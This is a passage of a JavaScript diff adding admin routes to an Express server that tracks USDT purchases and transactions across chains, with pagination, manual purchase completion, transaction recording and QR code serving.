+    const startIndex = (page - 1) * limit;
+    const endIndex = startIndex + parseInt(limit);
+    const paginated = filtered.slice(startIndex, endIndex);
+    
+    res.jsonResponse(true, {
+      purchases: paginated,
+      total: filtered.length,
+      page: parseInt(page),
+      limit: parseInt(limit),
+      totalPages: Math.ceil(filtered.length / limit)
+    });
+    
+  } catch (error) {
+    logger.error(`Admin purchases error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// POST /api/admin/mark-purchase-completed
+app.post('/api/admin/mark-purchase-completed', adminMiddleware, (req, res) => {
+  try {
+    const { purchaseId, transactionHash } = req.body;
+    
+    if (!purchaseId) {
+      return res.jsonResponse(false, null, 'Purchase ID is required', 400);
+    }
+    
+    const purchases = loadPurchases();
+    const purchaseIndex = purchases.findIndex(p => p.id === purchaseId);
+    
+    if (purchaseIndex === -1) {
+      return res.jsonResponse(false, null, 'Purchase not found', 404);
+    }
+    
+    purchases[purchaseIndex].status = 'completed';
+    purchases[purchaseIndex].verified = true;
+    purchases[purchaseIndex].verifiedAt = new Date().toISOString();
+    purchases[purchaseIndex].verifiedBy = 'admin';
+    
+    if (transactionHash) {
+      purchases[purchaseIndex].transactionHash = transactionHash;
+    }
+    
+    savePurchases(purchases);
+    
+    // Record transaction
+    if (transactionHash) {
+      const transactions = loadTransactions();
+      transactions.push({
+        id: uuidv4(),
+        purchaseId,
+        transactionHash,
+        chain: purchases[purchaseIndex].chain,
+        amountUSD: purchases[purchaseIndex].usdAmount,
+        amountUSDT: purchases[purchaseIndex].usdtAmount,
+        timestamp: new Date().toISOString(),
+        type: 'purchase',
+        status: 'completed',
+        verifiedBy: 'admin'
+      });
+      saveTransactions(transactions);
+    }
+    
+    res.jsonResponse(true, {
+      purchase: purchases[purchaseIndex],
+      message: 'Purchase marked as completed'
+    });
+    
+  } catch (error) {
+    logger.error(`Mark purchase completed error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// GET /api/admin/transactions
+app.get('/api/admin/transactions', adminMiddleware, (req, res) => {
+  try {
+    const { type, chain, limit = 50, page = 1 } = req.query;
+    const transactions = loadTransactions();
+    
+    let filtered = [...transactions];
+    
+    if (type) {
+      filtered = filtered.filter(t => t.type === type);
+    }
+    
+    if (chain) {
+      filtered = filtered.filter(t => t.chain === chain.toLowerCase());
+    }
+    
+    // Sort by date (newest first)
+    filtered.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+    
+    // Pagination
+    const startIndex = (page - 1) * limit;
+    const endIndex = startIndex + parseInt(limit);
+    const paginated = filtered.slice(startIndex, endIndex);
+    
+    res.jsonResponse(true, {
+      transactions: paginated,
+      total: filtered.length,
+      page: parseInt(page),
+      limit: parseInt(limit),
+      totalPages: Math.ceil(filtered.length / limit)
+    });
+    
+  } catch (error) {
+    logger.error(`Admin transactions error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// POST /api/admin/prepare-transaction
+app.post('/api/admin/prepare-transaction', adminMiddleware, (req, res) => {
+  try {
+    const { toAddress, chain, amountUSDT, notes } = req.body;
+    
+    if (!toAddress || !chain || !amountUSDT) {
+      return res.jsonResponse(false, null, 'Missing required fields', 400);
+    }
+    
+    const transactionId = uuidv4();
+    
+    res.jsonResponse(true, {
+      transactionId,
+      toAddress,
+      chain: chain.toLowerCase(),
+      amountUSDT: parseFloat(amountUSDT),
+      notes,
+      preparedAt: new Date().toISOString(),
+      message: 'Transaction prepared successfully'
+    });
+    
+  } catch (error) {
+    logger.error(`Prepare transaction error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// POST /api/admin/record-transaction
+app.post('/api/admin/record-transaction', adminMiddleware, (req, res) => {
+  try {
+    const { transactionId, transactionHash, chain, amountUSDT, toAddress, fromAddress, notes } = req.body;
+    
+    if (!transactionHash || !chain || !amountUSDT) {
+      return res.jsonResponse(false, null, 'Missing required fields', 400);
+    }
+    
+    const transactions = loadTransactions();
+    const newTransaction = {
+      id: transactionId || uuidv4(),
+      transactionHash,
+      chain: chain.toLowerCase(),
+      amountUSDT: parseFloat(amountUSDT),
+      toAddress,
+      fromAddress: fromAddress || 'system',
+      notes: notes || {},
+      timestamp: new Date().toISOString(),
+      type: 'transfer',
+      status: 'completed',
+      recordedBy: 'admin'
+    };
+    
+    transactions.push(newTransaction);
+    saveTransactions(transactions);
+    
+    res.jsonResponse(true, {
+      transaction: newTransaction,
+      message: 'Transaction recorded successfully'
+    });
+    
+  } catch (error) {
+    logger.error(`Record transaction error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// GET /api/qr/:chain
+app.get('/api/qr/:chain', (req, res) => {
+  try {
+    const { chain } = req.params;
+    const qrBase64 = getQRCodeBase64(chain);
+    
+    if (!qrBase64) {
+      return res.jsonResponse(false, null, 'QR code not available', 404);
+    }
+    
+    res.jsonResponse(true, {
+      chain: chain.toLowerCase(),
+      qrCode: qrBase64,
+      mimeType: 'image/png'
+    });
+    
+  } catch (error) {
+    logger.error(`QR endpoint error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+  logger.error(`Unhandled error: ${err.message}`, { stack: err.stack });
+  res.jsonResponse(false, null, 'Internal server error', 500);
+});
+
+// 404 handler
+app.use('*', (req, res) => {
+  res.jsonResponse(false, null, 'Endpoint not found', 404);
+});
+
+// Start server
 if (process.env.NODE_ENV !== 'production') {
-    app.listen(PORT, () => {
-        console.log(`Server running on port ${PORT}`);
-    });
+  app.listen(PORT, () => {
+    logger.info(`Server running on port ${PORT}`);
+    logger.info(`Environment: ${process.env.NODE_ENV || 'development'}`);
+  });
 }
 
+// Export for Vercel
 export default app;
